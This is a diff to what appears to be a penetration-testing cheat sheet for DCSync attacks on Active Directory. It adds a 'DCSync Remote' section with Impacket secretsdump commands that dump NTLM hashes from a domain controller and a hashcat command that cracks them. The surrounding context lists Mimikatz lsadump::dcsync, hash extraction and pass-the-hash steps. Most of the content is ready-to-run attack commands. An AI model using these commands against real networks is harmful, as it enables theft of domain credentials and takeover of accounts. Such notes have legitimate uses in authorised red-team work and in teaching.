@@ -10,9 +10,7 @@
 
 #### 2) lsadump::dcsync /domain:DOMAIN /user:OUR_LOW-PRIVILEGE_AD_USERNAME
 
-### Secretsdump.py on an account that is synced with the domain controller to dump hashes to PtH attack.
-
-### Privileges: Replicate Directory Changes, Replicate Directory Changes All
+### Privileges: Replicate Directory Changes, Replicate Directory Changes All, Replicated Directory Changes in Filtered Set
 
 ### Usually, Administrators, Domain Admins and Enterprise Admins have this privilege in their accounts.
 
@@ -39,3 +37,13 @@
 #### 7) cat FILE.txt | grep "Hash NTLM"
 
 #### 8) Offline password cracking / Pass-theHash (Mimikatz)
+
+# DCSync Remote
+
+### Secretsdump.py on an account that is synced with the domain controller to dump hashes to PtH attack.
+
+#### 1) python3 Impacket-Secretsdump.py -just-dc DOMAIN/AD_ADMIN_USER@DC_IP
+
+#### 2) python3 Impacket-Secretsdump.py -just-dc-ntlm DOMAIN/AD_ADMIN_USER@DC_IP
+
+#### 3) hashcat -m 1000 -a 0 hashes.txt /path/to/wordlist.txt
